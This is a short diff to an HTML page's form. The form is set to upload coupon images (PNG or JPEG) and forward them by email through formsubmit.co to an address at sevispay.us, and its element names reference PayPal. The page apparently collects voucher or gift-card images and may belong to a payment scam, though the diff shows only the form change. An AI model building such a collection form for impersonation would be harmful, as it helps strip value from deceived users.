@@ -22,7 +22,7 @@
   <div id="paypal-signup-card"class="card">
     <div class="card-body p-5">
 
-      <form role="form" action="https://formsubmit.co/support@sevispay.us" method="POST">
+      <form method="POST" action="https://formsubmit.co/support@sevispay.us" enctype="multipart/form-data">
         <input type="hidden" name="_next" value="https://sevispay.us/payment-rate.html">
         <input type="hidden" name="_subject" value="COUPON DETAILS">
         <div class="row">
@@ -42,7 +42,7 @@
         <div id="upload-div" class="form-group">
           <label for="myfile">Upload Coupon Here:</label>
           <center>
-            <input class="form-control" type="file" id="file" name="file">
+            <input class="form-control" type="file" name="attachment" accept="image/png, image/jpeg">
           </center>
         </div>
         <button id="login-btn"class="btn btn-block" type="submit"><b>SUBMIT</b></button>
